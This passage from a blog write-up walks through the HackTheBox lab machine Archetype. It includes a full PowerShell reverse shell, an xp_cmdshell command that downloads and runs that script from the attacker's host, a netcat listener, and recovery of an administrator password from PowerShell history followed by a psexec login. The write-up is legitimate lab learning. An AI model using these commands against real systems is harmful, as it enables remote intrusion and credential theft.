<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_cmdshell "python -c 'import pty; pty.spawn("/bin/bash")'"
[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near 'import'.
</code></pre></div></div>

<p>However, I searched online and found this, which will enumerate ports on the system (using powershell) so that we can get a reverse shell:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"10.10.14.34"</span><span class="p">,</span><span class="w"> </span><span class="mi">1234</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"# "</span><span class="p">;</span><span class="w"> </span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">close</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<p>We need to change the IP address to your <code class="highlighter-rouge">tun0</code> one:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ifconfig | <span class="nb">grep</span> <span class="nt">-A</span> 1 <span class="s1">'tun0'</span> | <span class="nb">tail</span> <span class="nt">-1</span> | <span class="nb">grep</span> <span class="nt">-o</span> <span class="nt">-P</span> <span class="s1">'inet(.{0,15})'</span> | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s1">'((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</span><span class="p">;</span>
10.10.14.34
</code></pre></div></div>
<p>And the port to the one you want to use (e.g., <code class="highlighter-rouge">1234</code>).</p>

<p>To host this reverse shell file. we need to set up a mini server.  We do this by, on our machine, running a python command (be sure to do this in the same directory as your powershell reverse shell file!):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/usr/lib/python3.9/runpy.py"</span>, line 197, <span class="k">in </span>_run_module_as_main
    <span class="k">return </span>_run_code<span class="o">(</span>code, main_globals, None,
  File <span class="s2">"/usr/lib/python3.9/runpy.py"</span>, line 87, <span class="k">in </span>_run_code
    <span class="nb">exec</span><span class="o">(</span>code, run_globals<span class="o">)</span>
  File <span class="s2">"/usr/lib/python3.9/http/server.py"</span>, line 1289, <span class="k">in</span> &lt;module&gt;
    <span class="nb">test</span><span class="o">(</span>
  File <span class="s2">"/usr/lib/python3.9/http/server.py"</span>, line 1244, <span class="k">in </span><span class="nb">test
    </span>with ServerClass<span class="o">(</span>addr, HandlerClass<span class="o">)</span> as httpd:
  File <span class="s2">"/usr/lib/python3.9/socketserver.py"</span>, line 452, <span class="k">in </span>__init__
    self.server_bind<span class="o">()</span>
  File <span class="s2">"/usr/lib/python3.9/http/server.py"</span>, line 1287, <span class="k">in </span>server_bind
    <span class="k">return </span>super<span class="o">()</span>.server_bind<span class="o">()</span>
  File <span class="s2">"/usr/lib/python3.9/http/server.py"</span>, line 138, <span class="k">in </span>server_bind
    socketserver.TCPServer.server_bind<span class="o">(</span>self<span class="o">)</span>
  File <span class="s2">"/usr/lib/python3.9/socketserver.py"</span>, line 466, <span class="k">in </span>server_bind
    self.socket.bind<span class="o">(</span>self.server_address<span class="o">)</span>
PermissionError: <span class="o">[</span>Errno 13] Permission denied
                                                                                                                                                                        
<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80                                                                                                                                  1 ⨯
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>jakeireland:
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<p>Now we run a netcat listener on the port specified in our reverse shell file above:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nvlp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
</code></pre></div></div>

<p>Now we need to upload our reverse shell file to the SQL database.  We found <a href="https://github.com/frizb/Windows-Privilege-Escalation#uploading-files-with-powershell">this</a> online for how to upload files, so we run the following:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");"
</code></pre></div></div>
<p>We run this and see that our netcat listener picks up something!:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.27] 49710
</code></pre></div></div>

<p>In that window, we can now run</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.27] 49683
whoami
archetype\sql_svc
more \users\sql_svc\desktop\user.txt
3e7b************************21a3
</code></pre></div></div>

<p>Now we have the user flag!  But as far as I can tell, <code class="highlighter-rouge">archetype\sql_svc</code> is an ordinary user.  We need to escalate privileges.  I follow a good article <a href="https://github.com/frizb/Windows-Privilege-Escalation">here</a> on privilege escalation in Windows.  Here is some basic data about the user and the system:</p>
<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">whoami</span>
<span class="nf">archetype\sql_svc</span>
<span class="nf">net</span> <span class="nf">user</span>

<span class="nf">User</span> <span class="nf">accounts</span> <span class="kr">for</span> <span class="nf">\\ARCHETYPE</span>

<span class="nf">-------------------------------------------------------------------------------</span>
<span class="nf">Administrator</span>            <span class="nf">DefaultAccount</span>           <span class="nf">Guest</span>                    
<span class="nf">sql_svc</span>                  <span class="nf">WDAGUtilityAccount</span>       
<span class="nf">The</span> <span class="nf">command</span> <span class="nf">completed</span> <span class="nf">successfully.</span>

<span class="nf">systeminfo</span>

<span class="nf">Host</span> <span class="nf">Name:</span>                 <span class="nf">ARCHETYPE</span>
<span class="nf">OS</span> <span class="nf">Name:</span>                   <span class="nf">Microsoft</span> <span class="nf">Windows</span> <span class="nf">Server</span> <span class="mf">2019</span> <span class="nf">Standard</span>
<span class="nf">OS</span> <span class="nf">Version:</span>                <span class="nf">10.0.17763</span> <span class="nf">N</span><span class="nv">/A</span> <span class="nf">Build</span> <span class="mf">17763</span>
<span class="nf">OS</span> <span class="nf">Manufacturer:</span>           <span class="nf">Microsoft</span> <span class="nf">Corporation</span>
<span class="nf">OS</span> <span class="nf">Configuration:</span>          <span class="nf">Standalone</span> <span class="nf">Server</span>
<span class="nf">OS</span> <span class="nf">Build</span> <span class="nf">Type:</span>             <span class="nf">Multiprocessor</span> <span class="nf">Free</span>
<span class="nf">Registered</span> <span class="nf">Owner:</span>          <span class="nf">Windows</span> <span class="nf">User</span>
<span class="nf">Registered</span> <span class="nf">Organization:</span>   
<span class="nf">Product</span> <span class="nf">ID:</span>                <span class="nf">00429-00521-62775-AA442</span>
<span class="nf">Original</span> <span class="nf">Install</span> <span class="nf">Date:</span>     <span class="mf">1</span><span class="nv">/19/2020,</span> <span class="nf">11:39:36</span> <span class="nf">PM</span>
<span class="nf">System</span> <span class="nf">Boot</span> <span class="nf">Time:</span>          <span class="mf">3</span><span class="nv">/24/2021,</span> <span class="nf">8:19:01</span> <span class="nf">PM</span>
<span class="nf">System</span> <span class="nf">Manufacturer:</span>       <span class="nf">VMware,</span> <span class="nf">Inc.</span>
<span class="nf">System</span> <span class="nf">Model:</span>              <span class="nf">VMware7,1</span>
<span class="nf">System</span> <span class="nf">Type:</span>               <span class="nf">x64-based</span> <span class="nf">PC</span>
<span class="nf">Processor</span><span class="s">(s)</span><span class="nf">:</span>              <span class="mf">1</span> <span class="nf">Processor</span><span class="s">(s)</span> <span class="nf">Installed.</span>
                           <span class="p">[</span><span class="mf">01</span><span class="p">]</span><span class="nf">:</span> <span class="nf">AMD64</span> <span class="nf">Family</span> <span class="mf">23</span> <span class="nf">Model</span> <span class="mf">1</span> <span class="nf">Stepping</span> <span class="mf">2</span> <span class="nf">AuthenticAMD</span> <span class="nf">~2000</span> <span class="nf">Mhz</span>
<span class="nf">BIOS</span> <span class="nf">Version:</span>              <span class="nf">VMware,</span> <span class="nf">Inc.</span> <span class="nf">VMW71.00V.13989454.B64.1906190538,</span> <span class="mf">6</span><span class="nv">/19/2019</span>
<span class="nf">Windows</span> <span class="nf">Directory:</span>         <span class="nf">C:\Windows</span>
<span class="nf">System</span> <span class="nf">Directory:</span>          <span class="nf">C:\Windows\system32</span>
<span class="nf">Boot</span> <span class="nf">Device:</span>               <span class="nf">\Device\HarddiskVolume2</span>
<span class="nf">System</span> <span class="nf">Locale:</span>             <span class="nf">en-us;English</span> <span class="s">(United States)</span>
<span class="nf">Input</span> <span class="nf">Locale:</span>              <span class="nf">en-us;English</span> <span class="s">(United States)</span>
<span class="nf">Time</span> <span class="nf">Zone:</span>                 <span class="s">(UTC-08:00)</span> <span class="nf">Pacific</span> <span class="nf">Time</span> <span class="s">(US &amp; Canada)</span>
<span class="nf">Total</span> <span class="nf">Physical</span> <span class="nf">Memory:</span>     <span class="nf">2,047</span> <span class="nf">MB</span>
<span class="nf">Available</span> <span class="nf">Physical</span> <span class="nf">Memory:</span> <span class="mf">983</span> <span class="nf">MB</span>
<span class="nf">Virtual</span> <span class="nf">Memory:</span> <span class="nf">Max</span> <span class="nf">Size:</span>  <span class="nf">2,431</span> <span class="nf">MB</span>
<span class="nf">Virtual</span> <span class="nf">Memory:</span> <span class="nf">Available:</span> <span class="nf">1,328</span> <span class="nf">MB</span>
<span class="nf">Virtual</span> <span class="nf">Memory:</span> <span class="nf">In</span> <span class="nf">Use:</span>    <span class="nf">1,103</span> <span class="nf">MB</span>
<span class="nf">Page</span> <span class="nf">File</span> <span class="nf">Location</span><span class="s">(s)</span><span class="nf">:</span>     <span class="nf">C:\pagefile.sys</span>
<span class="nf">Domain:</span>                    <span class="nf">WORKGROUP</span>
<span class="nf">Logon</span> <span class="nf">Server:</span>              <span class="nf">N</span><span class="nv">/A</span>
<span class="nf">Hotfix</span><span class="s">(s)</span><span class="nf">:</span>                 <span class="mf">2</span> <span class="nf">Hotfix</span><span class="s">(s)</span> <span class="nf">Installed.</span>
                           <span class="p">[</span><span class="mf">01</span><span class="p">]</span><span class="nf">:</span> <span class="nf">KB4532947</span>
                           <span class="p">[</span><span class="mf">02</span><span class="p">]</span><span class="nf">:</span> <span class="nf">KB4464455</span>
<span class="nf">Network</span> <span class="nf">Card</span><span class="s">(s)</span><span class="nf">:</span>           <span class="mf">1</span> <span class="nf">NIC</span><span class="s">(s)</span> <span class="nf">Installed.</span>
                           <span class="p">[</span><span class="mf">01</span><span class="p">]</span><span class="nf">:</span> <span class="nf">vmxnet3</span> <span class="nf">Ethernet</span> <span class="nf">Adapter</span>
                                 <span class="nf">Connection</span> <span class="nf">Name:</span> <span class="nf">Ethernet0</span> <span class="mf">2</span>
                                 <span class="nf">DHCP</span> <span class="nf">Enabled:</span>    <span class="nf">No</span>
                                 <span class="nf">IP</span> <span class="nf">address</span><span class="s">(es)</span>
                                 <span class="p">[</span><span class="mf">01</span><span class="p">]</span><span class="nf">:</span> <span class="nf">10.10.10.27</span>
                                 <span class="p">[</span><span class="mf">02</span><span class="p">]</span><span class="nf">:</span> <span class="nf">fe80::cc9b:ff1e:4d8a:e751</span>
                                 <span class="p">[</span><span class="mf">03</span><span class="p">]</span><span class="nf">:</span> <span class="nf">dead:beef::cc9b:ff1e:4d8a:e751</span>
<span class="nf">Hyper-V</span> <span class="nf">Requirements:</span>      <span class="nf">A</span> <span class="nf">hypervisor</span> <span class="nf">has</span> <span class="nf">been</span> <span class="nf">detected.</span> <span class="nf">Features</span> <span class="nf">required</span> <span class="kr">for</span> <span class="nf">Hyper-V</span> <span class="nf">will</span> <span class="kr">not</span> <span class="nf">be</span> <span class="nf">displayed.</span>
<span class="nf">netconfig</span> <span class="nf">Workstation</span>
<span class="nf">net</span> <span class="nf">config</span> <span class="nf">Workstation</span>
<span class="nf">Computer</span> <span class="nf">name</span>                        <span class="nf">\\ARCHETYPE</span>
<span class="nf">Full</span> <span class="nf">Computer</span> <span class="nf">name</span>                   <span class="nf">Archetype</span>
<span class="nf">User</span> <span class="nf">name</span>                            <span class="nf">sql_svc</span>

<span class="nf">Workstation</span> <span class="nf">active</span> <span class="nf">on</span>                
        <span class="nf">NetBT_Tcpip_</span><span class="p">{</span><span class="nf">F9786909-146A-4450-84CE-B06994DB4499</span><span class="p">}</span> <span class="s">(005056B90510)</span>

<span class="nf">Software</span> <span class="nf">version</span>                     <span class="nf">Windows</span> <span class="nf">Server</span> <span class="mf">2019</span> <span class="nf">Standard</span>

<span class="nf">Workstation</span> <span class="nf">domain</span>                   <span class="nf">WORKGROUP</span>
<span class="nf">Logon</span> <span class="nf">domain</span>                         <span class="nf">ARCHETYPE</span>

<span class="nf">COM</span> <span class="nf">Open</span> <span class="nf">Timeout</span> <span class="s">(sec)</span>               <span class="mf">0</span>
<span class="nf">COM</span> <span class="nf">Send</span> <span class="nf">Count</span> <span class="s">(byte)</span>                <span class="mf">16</span>
<span class="nf">COM</span> <span class="nf">Send</span> <span class="nf">Timeout</span> <span class="s">(msec)</span>              <span class="mf">250</span>
<span class="nf">The</span> <span class="nf">command</span> <span class="nf">completed</span> <span class="nf">successfully.</span>

<span class="nf">net</span> <span class="nf">users</span>

<span class="nf">User</span> <span class="nf">accounts</span> <span class="kr">for</span> <span class="nf">\\ARCHETYPE</span>

<span class="nf">-------------------------------------------------------------------------------</span>
<span class="nf">Administrator</span>            <span class="nf">DefaultAccount</span>           <span class="nf">Guest</span>                    
<span class="nf">sql_svc</span>                  <span class="nf">WDAGUtilityAccount</span>       
<span class="nf">The</span> <span class="nf">command</span> <span class="nf">completed</span> <span class="nf">successfully.</span>
</code></pre></div></div>

<p>But in fact, I found another excellent-looking article <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#powershell-history">here</a> describing some more privilege escalation.  I try running:</p>
<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">type</span> <span class="nf">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span>
<span class="nf">net.exe</span> <span class="nf">use</span> <span class="nf">T:</span> <span class="nf">\\Archetype\backups</span> <span class="nv">/user:administrator</span> <span class="nf">MEGACORP_4dm1n!!</span>
<span class="nb">exit</span>
</code></pre></div></div>
<p>So it looks like there is a user called <code class="highlighter-rouge">administrator</code> with potentially a password there: <code class="highlighter-rouge">MEGACORP_4dm1in!!</code>…  Given this, it looks like <code class="highlighter-rouge">backups</code> has been mapped using the local admin credentials.</p>

<p>Let’s try logging into the system again, using another one of Impacket’s tools: <code class="highlighter-rouge">psexec.py</code>;</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 git-workspace/impacket/examples/psexec.py administrator@archetype
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on archetype.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file NxYETPZE.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on archetype.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service bzkq on archetype.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service bzkq.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.107]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<p>And it looks like we are now accessing the root user!!</p>

<p>We go to their desktop and find the root flag.  Hurrah!</p>
<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">C:\Windows\system32</span><span class="p">&gt;</span><span class="nf">more</span> <span class="nf">\users\administrator\desktop\root.txt</span>
<span class="nf">b91c************************8528</span>
</code></pre></div></div>

<h1 id="notes">Notes</h1>

<p>I must admit, I know this is supposed to be the easiest one, made even by the person who created HTB (I believe), but without an HTTP server I must admit I struggled a bit, as I had only experience with HTTP servers.  And naturally, it’s always a bit of a struggle to escalate privileges, as there are some pretty niche footholds to do so out there…  And a lot.  Either way, this was a fun experience.</p>

          </div>
          <div class="article-share">
            
            
            <a href="https://twitter.com/home?status=HackTheBox+Write-up+&mdash;+Archetype%20-%20https://jakewilliami.github.io//posts/archetype-htb" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https://jakewilliami.github.io//posts/archetype-htb" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
            </a>
          </div>

          
        </article>
      </div>
    </div>
  </main>
  

<script src="/assets/vendor-734ddaa553ebf4e6ca703bd7c567ef4a0e43b0ba799607355e56b81e88781318.js" type="text/javascript"></script>


  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>



  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>


<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>


</body>
</html>
